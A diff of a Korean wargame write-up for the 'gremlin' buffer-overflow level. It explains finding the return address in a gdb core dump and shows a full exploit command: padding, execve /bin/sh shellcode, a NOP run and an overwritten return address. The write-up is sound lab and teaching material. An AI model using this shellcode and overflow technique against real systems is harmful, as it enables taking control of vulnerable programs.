@@ -105,7 +105,7 @@ core  gremlin
 먼저 해결책부터말하면
 >core dumped가 되었을땐 core파일이 생길 것 이다.  
 >그럼 그 코어 파일을 gdb로 연다음  
->x/100x $esp으로 \x90의 위치를 찾고
+>메모리 뜯어서 ret addr 찾고  
 >그 주소로 페이로드를 다시짜서 원본파일에 공격을 하면 성공이다.
 
 ```
@@ -115,6 +115,7 @@ Program terminated with signal 11, Segmentation fault.
 #0  0x90909090 in ?? ()
 (gdb) 
 ```
+  
 > '-c'옵션을 꼭 주어서 gdb를 실행하자
 
 
@@ -148,10 +149,10 @@ Program terminated with signal 11, Segmentation fault.
 [gate@localhost tmp]$
 ```
 메모리 뜯어본 결과
->argv[1]에 넣었던 AAA~ 는 bffffb 40~50에서 시작되므로
->널널히 bffffb50으로 ret addr을 맞쳐주자
->(그 뒤로 실행되다가 쉘코드를 만나면 쉘코드가 실행될 것 이다.)
-
+>argv[1]에 넣었던 AAA~ 는 bffffb 40~50에서 시작되므로  
+>널널히 bffffb50으로 ret addr을 맞쳐주자  
+>(그 뒤로 실행되다가 쉘코드를 만나면 쉘코드가 실행될 것 이다.)  
+  
 ```
 [gate@localhost tmp]$ ./gremlin `python -c 'print "A"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"  + ""x90" * 135 + "\x50\xfb\xff\xbf"'             `
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1󿿐h//shh/bin⏓ኂ°
